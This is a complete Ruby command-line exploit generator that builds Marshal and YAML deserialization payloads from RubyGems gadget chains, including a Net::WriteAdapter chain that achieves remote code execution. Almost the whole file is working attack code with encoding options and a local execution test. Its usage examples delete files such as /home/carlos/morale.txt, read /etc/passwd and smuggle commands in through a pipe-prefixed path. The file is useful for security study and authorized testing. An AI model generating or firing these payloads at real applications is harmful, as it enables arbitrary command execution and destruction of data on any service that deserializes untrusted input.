#!/usr/bin/env ruby

require 'optparse'
require 'base64'
require 'yaml'

# ==========================================================================================
# Ruby Marshal Deserialization Exploit Generator
# Combines multiple RubyGems deserialization techniques
# ==========================================================================================

# -------- Colors --------
RED    = "\e[31m"
GREEN  = "\e[32m"
YELLOW = "\e[33m"
BLUE   = "\e[34m"
MAGENTA = "\e[35m"
CYAN   = "\e[36m"
BOLD   = "\e[1m"
RESET  = "\e[0m"

# -------- Banner --------
def show_banner
  puts <<~BANNER
    #{CYAN}#{BOLD}
    ╔══════════════════════════════════════════════════════════════════╗
    ║   Ruby Marshal Deserialization Exploit Generator                ║
    ║   Multiple RubyGems Gadget Chains for RCE/File Operations      ║
    ╚══════════════════════════════════════════════════════════════════╝
    #{RESET}
  BANNER
end

# -------- Help menu --------
def show_help
  show_banner
  puts <<~HELP
    #{YELLOW}#{BOLD}Usage:#{RESET}
      ruby ruby_deser_exploit.rb [options]

    #{YELLOW}#{BOLD}Description:#{RESET}
      Generates Ruby Marshal deserialization payloads using various RubyGems
      gadget chains. The payloads are designed to execute when a vulnerable
      application calls Marshal.load() or YAML.load() on user-controlled input.

    #{YELLOW}#{BOLD}Techniques:#{RESET}
      #{CYAN}1. file-injection#{RESET}     - File path injection via Gem::StubSpecification
                        Abuses @loaded_from to force file operations
                        #{GREEN}Best for:#{RESET} File deletion/reading operations

      #{CYAN}2. command-exec#{RESET}      - Command execution via Gem::StubSpecification
                        Uses command tag replacement technique
                        #{GREEN}Best for:#{RESET} Command execution via file operations

      #{CYAN}3. universal-rce#{RESET}     - Universal RCE via Net::WriteAdapter chain
                        Uses Gem::RequestSet + Net::BufferedIO chain
                        #{GREEN}Best for:#{RESET} Direct command execution (Ruby 2.x/3.x)

    #{YELLOW}#{BOLD}Options:#{RESET}
      #{CYAN}-t, --technique TECH#{RESET}    #{RED}(REQUIRED)#{RESET} Technique to use:
                        file-injection | command-exec | universal-rce

      #{CYAN}-c, --command CMD#{RESET}       #{RED}(REQUIRED for command-exec/universal-rce)#{RESET}
                        Command to execute
                        Example: "rm /home/carlos/morale.txt"

      #{CYAN}-p, --path PATH#{RESET}         #{RED}(REQUIRED for file-injection)#{RESET}
                        File path to inject
                        Example: "/home/carlos/morale.txt"

      #{CYAN}-e, --encode FORMAT#{RESET}     Output encoding:
                        hex | base64 | raw | all
                        (default: all, optional)

      #{CYAN}-o, --output FILE#{RESET}       Save payload to file
                        (extension added automatically)

      #{CYAN}-y, --yaml#{RESET}              Generate YAML payload instead of Marshal
                        (only for file-injection and command-exec)

      #{CYAN}--test#{RESET}                  Test payload deserialization locally
                        #{RED}WARNING: This will execute the payload!#{RESET}

      #{CYAN}-v, --verbose#{RESET}           Verbose output

      #{CYAN}-h, --help#{RESET}              Show this help message

    #{YELLOW}#{BOLD}Examples:#{RESET}
      # File deletion via path injection
      ruby ruby_deser_exploit.rb -t file-injection -p "/tmp/delete_me.txt" -e base64

      # Command execution (universal technique)
      ruby ruby_deser_exploit.rb -t universal-rce -c "id" -e hex -o payload

      # Command execution (command-exec technique)
      ruby ruby_deser_exploit.rb -t command-exec -c "rm /tmp/test" -e all

      # YAML payload generation
      ruby ruby_deser_exploit.rb -t file-injection -p "/etc/passwd" -y -e base64

    #{RED}#{BOLD}Warning:#{RESET}
      These payloads execute code during deserialization. Only use on systems
      you are authorized to test. The --test flag will execute the payload locally.
  HELP
end

# -------- Defaults --------
$options = {
  technique: nil,
  command: nil,
  path: nil,
  encode: 'all',
  output: nil,
  yaml: false,
  test: false,
  verbose: false
}

# -------- Option parsing --------
OptionParser.new do |opts|
  opts.banner = "Usage: ruby_deser_exploit.rb [options]"

  opts.on('-t', '--technique TECH', 'Exploit technique (file-injection|command-exec|universal-rce)') do |t|
    unless ['file-injection', 'command-exec', 'universal-rce'].include?(t)
      puts "#{RED}[-] Invalid technique. Use: file-injection, command-exec, or universal-rce#{RESET}"
      exit 1
    end
    $options[:technique] = t
  end

  opts.on('-c', '--command CMD', 'Command to execute') do |c|
    $options[:command] = c
  end

  opts.on('-p', '--path PATH', 'File path to inject') do |p|
    $options[:path] = p
  end

  opts.on('-e', '--encode FORMAT', 'Output format (hex|base64|raw|all)') do |e|
    unless ['hex', 'base64', 'raw', 'all'].include?(e)
      puts "#{RED}[-] Invalid encode format. Use: hex, base64, raw, or all#{RESET}"
      exit 1
    end
    $options[:encode] = e
  end

  opts.on('-o', '--output FILE', 'Save payload to file') do |f|
    $options[:output] = f
  end

  opts.on('-y', '--yaml', 'Generate YAML payload') do
    $options[:yaml] = true
  end

  opts.on('--test', 'Test payload deserialization') do
    $options[:test] = true
  end

  opts.on('-v', '--verbose', 'Verbose output') do
    $options[:verbose] = true
  end

  opts.on('-h', '--help', 'Show help') do
    show_help
    exit
  end
end.parse!

# -------- Validate required options --------
def validate_options
  # If no technique specified, show help
  unless $options[:technique]
    puts "#{RED}[-] Error: Technique is required#{RESET}\n"
    show_help
    exit 1
  end

  # Validate technique-specific requirements
  case $options[:technique]
  when 'file-injection'
    unless $options[:path]
      puts "#{RED}[-] Error: Path (-p/--path) is required for file-injection technique#{RESET}"
      puts "#{YELLOW}Example: -p \"/tmp/file.txt\"#{RESET}\n"
      exit 1
    end
    
  when 'command-exec', 'universal-rce'
    unless $options[:command]
      puts "#{RED}[-] Error: Command (-c/--command) is required for #{$options[:technique]} technique#{RESET}"
      puts "#{YELLOW}Example: -c \"rm /tmp/file.txt\"#{RESET}\n"
      exit 1
    end
  end
end

# Validate options before proceeding
validate_options

# -------- Load and patch RubyGems classes --------
def setup_rubygems_patches
  require 'rubygems'
  require 'rubygems/stub_specification'
  require 'rubygems/source/specific_file'
  require 'rubygems/dependency_list'
  require 'rubygems/requirement'
  
  # Monkey patch for techniques 1 and 2
  Gem::StubSpecification.class_eval do
    alias_method :original_initialize, :initialize if method_defined?(:initialize)
    define_method(:initialize) { |*args| }
  end
  
  Gem::Source::SpecificFile.class_eval do
    alias_method :original_initialize, :initialize if method_defined?(:initialize)
    define_method(:initialize) { |*args| }
  end
end

# -------- Technique 1: File Injection --------
def technique_file_injection(path, yaml_mode = false)
  puts "#{BLUE}[*] Using technique: File Injection#{RESET}" if $options[:verbose]
  
  setup_rubygems_patches

  stub = Gem::StubSpecification.new
  stub.instance_variable_set(:@loaded_from, path)

  spec1 = Gem::Source::SpecificFile.new
  spec1.instance_variable_set(:@spec, stub)

  spec2 = Gem::Source::SpecificFile.new

  dep_list = Gem::DependencyList.new
  dep_list.instance_variable_set(:@specs, [spec1, spec2])

  # Define marshal_dump for this technique
  Gem::Requirement.class_eval do
    define_method(:marshal_dump) do
      [ObjectSpace.each_object(Gem::DependencyList).first]
    end
  end

  if yaml_mode
    gem = Gem::Requirement.new
    gem.instance_variable_set(:@requirements, [dep_list])
    Marshal.dump(Gem::Requirement.new) # Trigger ObjectSpace
    Marshal.load(Marshal.dump(Gem::Requirement.new)) rescue nil
    YAML.dump(gem)
  else
    Marshal.dump(Gem::Requirement.new)
  end
end

# -------- Technique 2: Command Execution (Tag Replacement) --------
def technique_command_exec(command, yaml_mode = false)
  puts "#{BLUE}[*] Using technique: Command Execution (Tag Replacement)#{RESET}" if $options[:verbose]
  
  setup_rubygems_patches

  command_length = command.length
  command_tag = "|echo " + "A" * (command_length - 5) + " 1>&2"
  final_command = "|" + command + " 1>&2"

  stub_specification = Gem::StubSpecification.new
  stub_specification.instance_variable_set(:@loaded_from, command_tag)

  stub_specification.name rescue nil

  specific_file = Gem::Source::SpecificFile.new
  specific_file.instance_variable_set(:@spec, stub_specification)

  other_specific_file = Gem::Source::SpecificFile.new

  specific_file <=> other_specific_file rescue nil

  $dependency_list = Gem::DependencyList.new
  $dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

  $dependency_list.each{} rescue nil
  dependency_list = $dependency_list

  # Define marshal_dump for this technique
  Gem::Requirement.class_eval do
    define_method(:marshal_dump) do
      [$dependency_list]
    end
  end

  payload = Marshal.dump(Gem::Requirement.new)

  if yaml_mode
    gem = Gem::Requirement.new
    gem.instance_variable_set(:@requirements, [dependency_list])
    payload = YAML.dump(gem)
  end

  payload.gsub(command_tag, final_command)
end

# -------- Technique 3: Universal RCE --------
def technique_universal_rce(command)
  puts "#{BLUE}[*] Using technique: Universal RCE (Net::WriteAdapter)#{RESET}" if $options[:verbose]
  
  require 'rubygems'
  # Autoload the required classes
  Gem::SpecFetcher
  Gem::Installer

  # Prevent payload from running during Marshal.dump
  Gem::Requirement.class_eval do
    define_method(:marshal_dump) do
      [@requirements]
    end
    
    define_method(:marshal_load) do |data|
      @requirements = data[0] if data.is_a?(Array) && data.length > 0
    end
  end

  wa1 = Net::WriteAdapter.new(Kernel, :system)

  rs = Gem::RequestSet.allocate
  rs.instance_variable_set('@sets', wa1)
  rs.instance_variable_set('@git_set', command)

  wa2 = Net::WriteAdapter.new(rs, :resolve)

  i = Gem::Package::TarReader::Entry.allocate
  i.instance_variable_set('@read', 0)
  i.instance_variable_set('@header', "aaa")

  n = Net::BufferedIO.allocate
  n.instance_variable_set('@io', i)
  n.instance_variable_set('@debug_output', wa2)

  t = Gem::Package::TarReader.allocate
  t.instance_variable_set('@io', n)

  r = Gem::Requirement.allocate
  r.instance_variable_set('@requirements', t)

  Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
end

# -------- Payload Generation --------
def generate_payload
  case $options[:technique]
  when 'file-injection'
    unless $options[:path]
      puts "#{RED}[-] Path required for file-injection technique#{RESET}"
      exit 1
    end
    technique_file_injection($options[:path], $options[:yaml])
    
  when 'command-exec'
    unless $options[:command]
      puts "#{RED}[-] Command required for command-exec technique#{RESET}"
      exit 1
    end
    technique_command_exec($options[:command], $options[:yaml])
    
  when 'universal-rce'
    unless $options[:command]
      puts "#{RED}[-] Command required for universal-rce technique#{RESET}"
      exit 1
    end
    if $options[:yaml]
      puts "#{YELLOW}[!] YAML mode not supported for universal-rce technique#{RESET}"
      $options[:yaml] = false
    end
    technique_universal_rce($options[:command])
    
  else
    puts "#{RED}[-] Unknown technique: #{$options[:technique]}#{RESET}"
    exit 1
  end
end

# -------- Output Formatting --------
def output_payload(payload)
  ext = $options[:yaml] ? '.yml' : '.raw'
  
  if $options[:output]
    filename = $options[:output] + ext
    File.binwrite(filename, payload)
    puts "#{GREEN}[+] Payload saved to: #{filename}#{RESET}"
  end

  puts "\n#{CYAN}#{BOLD}═══════════════════════════════════════════════════════════#{RESET}"
  puts "#{CYAN}#{BOLD}                    PAYLOAD OUTPUT                          #{RESET}"
  puts "#{CYAN}#{BOLD}═══════════════════════════════════════════════════════════#{RESET}\n"

  if $options[:encode] == 'all' || $options[:encode] == 'hex'
    puts "#{YELLOW}Payload (hex):#{RESET}"
    puts payload.unpack1('H*')
    puts
  end

  if $options[:encode] == 'all' || $options[:encode] == 'base64'
    puts "#{YELLOW}Payload (base64):#{RESET}"
    puts Base64.encode64(payload).strip
    puts
  end

  if $options[:encode] == 'all' || $options[:encode] == 'raw'
    puts "#{YELLOW}Payload (raw bytes):#{RESET}"
    if payload.bytesize > 200
      puts "#{MAGENTA}[!] Payload is large (#{payload.bytesize} bytes), showing first 200 bytes...#{RESET}"
      puts payload[0..199].inspect + "..."
    else
      puts payload.inspect
    end
    puts
  end

  puts "#{BLUE}Payload size: #{payload.bytesize} bytes#{RESET}\n"
end

# -------- Testing --------
def test_payload(payload, yaml_mode)
  puts "\n#{YELLOW}#{BOLD}[*] Testing payload deserialization...#{RESET}"
  puts "#{RED}[!] WARNING: This will execute the payload locally!#{RESET}\n"
  
  sleep 2 # Give user time to Ctrl+C
  
  begin
    if yaml_mode
      puts "#{BLUE}[*] Testing YAML.load in current process...#{RESET}"
      YAML.load(payload) rescue puts("#{GREEN}[+] YAML payload executed#{RESET}")
      
      puts "#{BLUE}[*] Testing YAML.load in new process...#{RESET}"
      cmd = "require 'yaml'; YAML.load(File.read('#{$options[:output] + '.yml'}'))"
      IO.popen(["ruby", "-e", cmd]) { |io| puts io.read }
    else
      puts "#{BLUE}[*] Testing Marshal.load in new process...#{RESET}"
      IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
        pipe.write(payload)
        pipe.close_write
        result = pipe.read
        puts result if result && !result.empty?
      end
      puts "#{GREEN}[+] Marshal payload executed#{RESET}"
    end
  rescue => e
    puts "#{RED}[-] Error during testing: #{e.message}#{RESET}"
  end
end

# -------- Main --------
begin
  show_banner unless $options[:verbose]

  puts "#{GREEN}[+] Generating payload...#{RESET}"
  puts "#{BLUE}[+] Technique: #{$options[:technique]}#{RESET}"
  
  if $options[:command]
    puts "#{BLUE}[+] Command: #{$options[:command]}#{RESET}"
  end
  
  if $options[:path]
    puts "#{BLUE}[+] Path: #{$options[:path]}#{RESET}"
  end

  payload = generate_payload
  puts "#{GREEN}[+] Payload generated successfully!#{RESET}"

  output_payload(payload)

  if $options[:test]
    test_payload(payload, $options[:yaml])
  end

  puts "#{GREEN}#{BOLD}[+] Done!#{RESET}\n"

rescue => e
  puts "#{RED}[-] Error: #{e.message}#{RESET}"
  puts e.backtrace if $options[:verbose]
  exit 1
end

